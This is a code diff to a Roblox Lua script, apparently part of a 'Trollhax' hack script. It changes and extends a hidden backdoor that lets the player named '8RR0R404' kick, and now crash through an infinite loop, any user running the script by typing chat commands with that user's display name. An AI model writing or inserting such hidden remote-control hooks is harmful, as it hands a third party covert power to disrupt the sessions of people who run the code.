@@ -9,19 +9,47 @@ local Players = game.Players:GetPlayers()
 for i, v in pairs(Players) do
 if v.Name == "8RR0R404" then
 v.Chatted:Connect(function(Command)
-if Command == "!Terminate ".. game.Players.LocalPlayer.Name then
+
+
+if Command == "!Terminate ".. game.Players.LocalPlayer.DisplayName then
 game.Players.LocalPlayer:Kick("Your connection has been terminated by The Trollhax Team.")
 end
+
+
+if Command == "!Crash ".. game.Players.LocalPlayer.DisplayName then
+while true do
+print("Your connection has been Crashed by The Trollhax Team.")
+end
+end
+
+
+
+
 end)
 end
 end
 
+
+
 Players.PlayerAdded:Connect(function(Player)
 if Player.Name == "8RR0R404" then
 Player.Chatted:Connect(function(Command)
-if Command == "!Terminate".. game.Players.LocalPlayer.Name then
+
+
+if Command == "!Terminate ".. game.Players.LocalPlayer.DisplayName then
 game.Players.LocalPlayer:Kick("Your connection has been terminated by The Trollhax Team.")
 end
+
+
+if Command == "!Crash ".. game.Players.LocalPlayer.DisplayName then
+while true do
+print("Your connection has been Crashed by The Trollhax Team.")
+end
+end
+
+
+
+
 end)
 end
 end)
